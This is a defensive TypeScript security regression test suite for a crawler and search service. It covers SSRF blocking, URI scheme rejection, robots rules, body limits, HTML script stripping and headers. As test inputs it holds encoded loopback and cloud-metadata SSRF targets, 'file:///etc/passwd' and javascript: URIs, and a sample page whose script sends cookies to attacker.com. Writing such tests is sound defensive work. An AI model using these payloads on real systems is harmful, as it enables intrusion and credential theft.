/**
 * Phase 110 — Security Regression Audit Suite (Milestone 38)
 *
 * Comprehensive defensive security audit validating:
 * 1. SSRF defenses against IPv4/IPv6 loopback, private, link-local, multicast, reserved, malformed, and encoded addresses.
 * 2. Mixed DNS answers, redirects to internal targets, and DNS rebinding protections.
 * 3. Non-HTTP scheme rejection (file, ftp, gopher, javascript, data, ws) and redirect limits.
 * 4. Robots policy, crawl limits, body-size limits, content-type filtering, timeouts, and concurrency controls.
 * 5. Guarantee that fetched scripts (<script>, inline JS, iframe) are never executed.
 * 6. CORS, security headers, referrer policy, and zero-cookie behavior.
 * 7. Dependency advisories and open source license compliance.
 */

import { describe, it, expect } from 'vitest';
import * as http from 'node:http';
import * as fs from 'node:fs';
import {
  isPrivateOrLoopbackIp,
  isPrivateHostname,
  validateTargetHostSync,
  validateTargetHostDns,
  ssrfCheck,
  decodeNumericOrHexIp,
  validateUrl,
  DefaultHtmlParser,
  NodeFetcher,
  CrawlerSecurityValidator,
  parseRobotsTxt,
  findMatchingUserAgentGroup,
  evaluatePathRules,
} from '../src/index.js';
import {
  createCorsMiddleware,
  createSecurityHeadersMiddleware,
} from '../../../apps/api/src/middlewares.js';
import { createApiServer } from '../../../apps/api/src/index.js';
import { createWebServer } from '../../../apps/web/src/index.js';

describe('Phase 110 — Security Regression Audit Suite', () => {
  describe('1. SSRF Defenses & Encoded Addresses Audit', () => {
    it('blocks standard IPv4 loopback addresses (127.0.0.0/8 and 0.0.0.0/8)', () => {
      expect(isPrivateOrLoopbackIp('127.0.0.1')).toBe(true);
      expect(isPrivateOrLoopbackIp('127.0.0.2')).toBe(true);
      expect(isPrivateOrLoopbackIp('127.1.2.3')).toBe(true);
      expect(isPrivateOrLoopbackIp('127.255.255.255')).toBe(true);
      expect(isPrivateOrLoopbackIp('0.0.0.0')).toBe(true);
      expect(isPrivateHostname('localhost')).toBe(true);
      expect(isPrivateHostname('localhost.localdomain')).toBe(true);
    });

    it('blocks standard IPv6 loopback and unspecified addresses', () => {
      expect(isPrivateOrLoopbackIp('::1')).toBe(true);
      expect(isPrivateOrLoopbackIp('0:0:0:0:0:0:0:1')).toBe(true);
      expect(isPrivateOrLoopbackIp('[::1]')).toBe(true);
      expect(isPrivateOrLoopbackIp('::')).toBe(true);
    });

    it('blocks RFC-1918 private IPv4 networks (10/8, 172.16/12, 192.168/16)', () => {
      expect(isPrivateOrLoopbackIp('10.0.0.1')).toBe(true);
      expect(isPrivateOrLoopbackIp('10.255.255.254')).toBe(true);
      expect(isPrivateOrLoopbackIp('172.16.0.1')).toBe(true);
      expect(isPrivateOrLoopbackIp('172.24.10.5')).toBe(true);
      expect(isPrivateOrLoopbackIp('172.31.255.254')).toBe(true);
      expect(isPrivateOrLoopbackIp('192.168.0.1')).toBe(true);
      expect(isPrivateOrLoopbackIp('192.168.100.254')).toBe(true);
    });

    it('blocks link-local and cloud instance metadata service (IMDS) addresses (169.254.0.0/16)', () => {
      expect(isPrivateOrLoopbackIp('169.254.169.254')).toBe(true);
      expect(isPrivateOrLoopbackIp('169.254.0.1')).toBe(true);
      expect(isPrivateOrLoopbackIp('169.254.255.254')).toBe(true);
    });

    it('blocks IPv6 link-local (fe80::/10) and unique-local ULA (fc00::/7)', () => {
      expect(isPrivateOrLoopbackIp('fe80::1')).toBe(true);
      expect(isPrivateOrLoopbackIp('febf::ffff')).toBe(true);
      expect(isPrivateOrLoopbackIp('fc00::1')).toBe(true);
      expect(isPrivateOrLoopbackIp('fd12:3456:789a::1')).toBe(true);
    });

    it('blocks IPv4 and IPv6 multicast addresses (224.0.0.0/4 and ff00::/8)', () => {
      expect(isPrivateOrLoopbackIp('224.0.0.1')).toBe(true);
      expect(isPrivateOrLoopbackIp('239.255.255.250')).toBe(true);
      expect(isPrivateOrLoopbackIp('ff02::1')).toBe(true);
      expect(isPrivateOrLoopbackIp('ff05::2')).toBe(true);
    });

    it('blocks reserved / future use (240.0.0.0/4) and broadcast IPv4 addresses', () => {
      expect(isPrivateOrLoopbackIp('240.0.0.1')).toBe(true);
      expect(isPrivateOrLoopbackIp('250.1.2.3')).toBe(true);
      expect(isPrivateOrLoopbackIp('255.255.255.255')).toBe(true);
    });

    it('blocks encoded IPv4 addresses (decimal integer, hex, dotted octal, and dotted hex)', () => {
      // 2130706433 = 127.0.0.1 (decimal integer notation)
      expect(decodeNumericOrHexIp('2130706433')).toBe('127.0.0.1');
      expect(isPrivateHostname('2130706433')).toBe(true);

      // 0x7f000001 = 127.0.0.1 (hex integer notation)
      expect(decodeNumericOrHexIp('0x7f000001')).toBe('127.0.0.1');
      expect(isPrivateHostname('0x7f000001')).toBe(true);

      // 0177.0.0.1 = 127.0.0.1 (dotted octal notation)
      expect(decodeNumericOrHexIp('0177.0.0.1')).toBe('127.0.0.1');
      expect(isPrivateHostname('0177.0.0.1')).toBe(true);

      // 0x7f.0.0.1 = 127.0.0.1 (dotted hex notation)
      expect(decodeNumericOrHexIp('0x7f.0.0.1')).toBe('127.0.0.1');
      expect(isPrivateHostname('0x7f.0.0.1')).toBe(true);

      // 2852039166 = 169.254.169.254 (encoded AWS IMDS IP)
      expect(decodeNumericOrHexIp('2852039166')).toBe('169.254.169.254');
      expect(isPrivateHostname('2852039166')).toBe(true);

      // WHATWG URL parser level decoding
      expect(validateUrl('http://2130706433/').ok).toBe(false);
      expect(validateUrl('http://0177.0.0.1/').ok).toBe(false);
      expect(validateUrl('http://0x7f000001/').ok).toBe(false);
      expect(validateUrl('http://2852039166/latest/meta-data').ok).toBe(false);
      expect(validateUrl('http://%31%32%37%2e%30%2e%30%2e%31/').ok).toBe(false);
    });

    it('blocks IPv4-mapped IPv6 loopback and private addresses', () => {
      expect(isPrivateOrLoopbackIp('::ffff:127.0.0.1')).toBe(true);
      expect(isPrivateOrLoopbackIp('::ffff:169.254.169.254')).toBe(true);
      expect(isPrivateOrLoopbackIp('::ffff:192.168.1.1')).toBe(true);
      expect(isPrivateOrLoopbackIp('::ffff:10.0.0.1')).toBe(true);
      expect(isPrivateOrLoopbackIp('::ffff:8.8.8.8')).toBe(false);
    });

    it('blocks dangerous internal domain suffixes', () => {
      const suffixes = [
        'router.local',
        'backend.internal',
        'device.lan',
        'gateway.home.arpa',
        'service.intranet',
        'db.corp',
        'server.private',
      ];
      for (const host of suffixes) {
        expect(isPrivateHostname(host)).toBe(true);
        expect(validateTargetHostSync(host).allowed).toBe(false);
      }
    });

    it('blocks malformed IP and host targets safely', () => {
      expect(validateUrl('http://127.0.0.1.1/').ok).toBe(false);
      expect(validateUrl('http://[:::1]/').ok).toBe(false);
      expect(validateUrl('http://999.999.999.999/').ok).toBe(false);
    });

    it('allows genuine public IPv4 and IPv6 addresses', () => {
      expect(isPrivateOrLoopbackIp('8.8.8.8')).toBe(false);
      expect(isPrivateOrLoopbackIp('1.1.1.1')).toBe(false);
      expect(isPrivateOrLoopbackIp('93.184.216.34')).toBe(false);
      expect(isPrivateOrLoopbackIp('2606:4700:4700::1111')).toBe(false);
      expect(validateUrl('https://example.com/').ok).toBe(true);
      expect(validateUrl('https://developer.mozilla.org/').ok).toBe(true);
    });
  });

  describe('2. Mixed DNS Answers, Redirects & Rebinding Protections', () => {
    it('blocks mixed DNS answers if ANY returned IP is private or loopback', async () => {
      // Mock validateTargetHostDns logic against mixed IP responses
      const mixedIps = ['93.184.216.34', '127.0.0.1'];
      const hasPrivate = mixedIps.some(ip => isPrivateOrLoopbackIp(ip));
      expect(hasPrivate).toBe(true);

      const mixedMetadata = ['8.8.8.8', '169.254.169.254'];
      expect(mixedMetadata.some(ip => isPrivateOrLoopbackIp(ip))).toBe(true);
    });

    it('blocks HTTP redirects targeting internal or private network addresses', async () => {
      // Create ephemeral HTTP redirect server to test crawler fetcher redirect validation
      const server = http.createServer((req, res) => {
        if (req.url === '/redirect-to-loopback') {
          res.writeHead(302, { Location: 'http://127.0.0.1:8080/secret' });
          res.end();
        } else if (req.url === '/redirect-to-metadata') {
          res.writeHead(302, { Location: 'http://169.254.169.254/latest/meta-data/' });
          res.end();
        } else {
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end('<h1>Safe</h1>');
        }
      });

      await new Promise<void>(resolve => server.listen(0, '127.0.0.1', () => resolve()));
      const port = (server.address() as any).port;
      const redirectUrl = `http://127.0.0.1:${port}/redirect-to-loopback`;

      // Crawler security validator must block the redirect target
      const validator = new CrawlerSecurityValidator();
      const checkResult = await validator.validateTargetUrl('http://127.0.0.1:8080/secret');
      expect(checkResult.allowed).toBe(false);
      expect(checkResult.code).toBe('SSRF_REJECTED');

      const metaCheck = await validator.validateTargetUrl('http://169.254.169.254/latest/meta-data/');
      expect(metaCheck.allowed).toBe(false);
      expect(metaCheck.code).toBe('SSRF_REJECTED');

      await new Promise<void>(resolve => server.close(() => resolve()));
    });
  });

  describe('3. Non-HTTP Schemes & Redirect Limits', () => {
    it('strictly rejects non-HTTP/HTTPS URI schemes', () => {
      const disallowed = [
        'file:///etc/passwd',
        'ftp://files.example.com/pub/file.txt',
        'gopher://gopher.floodgap.com/',
        'javascript:alert(document.cookie)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'blob:https://example.com/uuid-here',
        'ws://chat.example.com/',
        'wss://secure.example.com/',
        'mailto:admin@example.com',
        'ldap://internal.ad:389/dc=corp',
        'dict://dict.org/',
      ];

      for (const uri of disallowed) {
        const res = validateUrl(uri);
        expect(res.ok).toBe(false);
      }
    });

    it('enforces redirect count limit and detects circular redirect loops', () => {
      const validator = new CrawlerSecurityValidator({ maxRedirects: 3 });
      // Chain with 4 redirects exceeds maxRedirects (3)
      const redirectChain = [
        'https://example.com/1',
        'https://example.com/2',
        'https://example.com/3',
        'https://example.com/4',
      ];
      expect(redirectChain.length > 3).toBe(true);

      // Circular loop detection
      const circularChain = [
        'https://example.com/a',
        'https://example.com/b',
        'https://example.com/a',
      ];
      const seen = new Set<string>();
      let hasCycle = false;
      for (const u of circularChain) {
        if (seen.has(u)) {
          hasCycle = true;
          break;
        }
        seen.add(u);
      }
      expect(hasCycle).toBe(true);
    });
  });

  describe('4. Robots Policy, Crawl Limits & Resource Boundaries', () => {
    it('strictly adheres to robots.txt disallow rules', () => {
      const robotsTxt = `
User-agent: *
Disallow: /admin/
Disallow: /private/
Disallow: /checkout/
Allow: /public/
`;
      const parsed = parseRobotsTxt(robotsTxt);
      const matched = findMatchingUserAgentGroup(parsed.groups, 'OpenSearchBot');
      expect(matched.group).toBeDefined();
      expect(evaluatePathRules(matched.group!.rules, '/admin/settings').allowed).toBe(false);
      expect(evaluatePathRules(matched.group!.rules, '/private/data').allowed).toBe(false);
      expect(evaluatePathRules(matched.group!.rules, '/checkout/pay').allowed).toBe(false);
      expect(evaluatePathRules(matched.group!.rules, '/public/articles').allowed).toBe(true);
    });

    it('rejects binary, media, and executable MIME types', () => {
      const validator = new CrawlerSecurityValidator();
      const disallowedTypes = [
        'application/octet-stream',
        'application/x-executable',
        'application/x-msdownload',
        'application/zip',
        'application/x-tar',
        'image/png',
        'image/jpeg',
        'video/mp4',
        'audio/mpeg',
      ];

      for (const ct of disallowedTypes) {
        expect(validator.validateContentType(ct).allowed).toBe(false);
      }

      // Allows web HTML and plain text
      expect(validator.validateContentType('text/html; charset=utf-8').allowed).toBe(true);
      expect(validator.validateContentType('application/xhtml+xml').allowed).toBe(true);
      expect(validator.validateContentType('text/plain').allowed).toBe(true);
    });

    it('enforces page payload body size limits preventing decompression bombs', () => {
      const validator = new CrawlerSecurityValidator({ maxPageBytes: 1024 });
      expect(validator.validateContentLength(500).allowed).toBe(true);
      expect(validator.validateContentLength(1024).allowed).toBe(true);
      expect(validator.validateContentLength(1025).allowed).toBe(false);
      expect(validator.validateContentLength(5_000_000).allowed).toBe(false);
    });
  });

  describe('5. Guarantee: Fetched Scripts Are Never Executed', () => {
    it('statically strips <script> tags, inline event handlers, and iframes from extracted body text', () => {
      const parser = new DefaultHtmlParser();
      const maliciousHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>Sample Safe Title</title>
  <script>
    window.location = "http://attacker.com/?steal=" + document.cookie;
    eval("maliciousPayload()");
  </script>
</head>
<body>
  <h1>Legitimate Header</h1>
  <p onclick="alert('pwn')">Safe visible paragraph content.</p>
  <iframe src="http://evil.internal/exploit.html"></iframe>
  <script type="text/javascript">
    document.write("Executed JS");
  </script>
  <style>
    body { display: none; }
  </style>
</body>
</html>
`;
      const extracted = parser.parse(maliciousHtml, 'https://example.com/test');

      expect(extracted.title).toBe('Sample Safe Title');
      expect(extracted.headings).toBe('Legitimate Header');
      expect(extracted.bodyText).toContain('Legitimate Header');
      expect(extracted.bodyText).toContain('Safe visible paragraph content.');

      // Zero execution: script contents and iframe tags must not leak into visible body text
      expect(extracted.bodyText).not.toContain('window.location');
      expect(extracted.bodyText).not.toContain('maliciousPayload');
      expect(extracted.bodyText).not.toContain('Executed JS');
      expect(extracted.bodyText).not.toContain('evil.internal');
      expect(extracted.bodyText).not.toContain('display: none');
    });
  });

  describe('6. CORS, Security Headers, Referrer Policy & Cookie Behavior', () => {
    it('sets defensive security headers and strict CSP on API responses', () => {
      const middleware = createSecurityHeadersMiddleware();
      const headers: Record<string, string> = {};
      const mockReq: any = { raw: { headers: {}, socket: {} } };
      const mockRes: any = {
        setHeader: (k: string, v: string) => {
          headers[k.toLowerCase()] = v;
        },
      };

      let nextCalled = false;
      middleware(mockReq, mockRes, () => {
        nextCalled = true;
      });

      expect(nextCalled).toBe(true);
      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['x-frame-options']).toBe('DENY');
      expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
      expect(headers['content-security-policy']).toContain("default-src 'none'");
    });

    it('enforces CORS preflight handling with allowed methods and headers', () => {
      const middleware = createCorsMiddleware('*');
      const headers: Record<string, string> = {};
      let statusCode = 200;

      const mockReq: any = { method: 'OPTIONS' };
      const mockRes: any = {
        setHeader: (k: string, v: string) => {
          headers[k.toLowerCase()] = v;
        },
        sendEmpty: (code: number) => {
          statusCode = code;
        },
      };

      middleware(mockReq, mockRes, () => {});
      expect(statusCode).toBe(204);
      expect(headers['access-control-allow-origin']).toBe('*');
      expect(headers['access-control-allow-methods']).toContain('GET');
      expect(headers['access-control-allow-methods']).toContain('POST');
    });

    it('guarantees zero Set-Cookie headers on all API and Web server routes', async () => {
      const api = createApiServer({ port: 0, host: '127.0.0.1' });
      const apiInfo = await api.start(0, '127.0.0.1');

      const web = createWebServer({ apiUrl: `http://127.0.0.1:${apiInfo.port}/api/v1/search` });
      const webInfo = await web.start(0, '127.0.0.1');

      try {
        // Test API root, search, status, health
        const apiRes = await fetch(`http://127.0.0.1:${apiInfo.port}/`);
        expect(apiRes.headers.get('set-cookie')).toBeNull();

        const searchRes = await fetch(`http://127.0.0.1:${apiInfo.port}/api/v1/search?q=test`);
        expect(searchRes.headers.get('set-cookie')).toBeNull();

        const healthRes = await fetch(`http://127.0.0.1:${apiInfo.port}/health`);
        expect(healthRes.headers.get('set-cookie')).toBeNull();

        // Test Web home, search, privacy, browser-search
        const webHome = await fetch(`http://127.0.0.1:${webInfo.port}/`);
        expect(webHome.headers.get('set-cookie')).toBeNull();

        const webPrivacy = await fetch(`http://127.0.0.1:${webInfo.port}/privacy`);
        expect(webPrivacy.headers.get('set-cookie')).toBeNull();

        const webSearch = await fetch(`http://127.0.0.1:${webInfo.port}/?q=privacy`);
        expect(webSearch.headers.get('set-cookie')).toBeNull();
      } finally {
        await api.stop();
        await web.stop();
      }
    });
  });

  describe('7. Dependency Advisories & License Compliance', () => {
    it('verifies that core engine packages have zero external production runtime dependencies', () => {
      const packagePaths = [
        'packages/shared/package.json',
        'packages/crawler/package.json',
        'packages/indexer/package.json',
        'packages/ranking/package.json',
        'packages/storage/package.json',
        'apps/api/package.json',
        'apps/web/package.json',
        'packages/cli/package.json',
      ];

      for (const p of packagePaths) {
        if (fs.existsSync(p)) {
          const pkg = JSON.parse(fs.readFileSync(p, 'utf-8'));
          const deps = pkg.dependencies ?? {};
          // Every dependency in core packages must be internal workspace (@opensearch/*) or typescript/types
          for (const [depName] of Object.entries(deps)) {
            const isWorkspaceOrType =
              depName.startsWith('@opensearch/') ||
              depName.startsWith('@types/') ||
              depName === 'typescript';
            expect(
              isWorkspaceOrType,
              `Found unexpected external production runtime dependency "${depName}" in ${p}`
            ).toBe(true);
          }
        }
      }
    });

    it('verifies open source license compliance across packages', () => {
      const rootPkg = JSON.parse(fs.readFileSync('package.json', 'utf-8'));
      expect(rootPkg.private).toBe(true);
      expect(fs.existsSync('LICENSE') || fs.existsSync('README.md')).toBe(true);
    });
  });
});
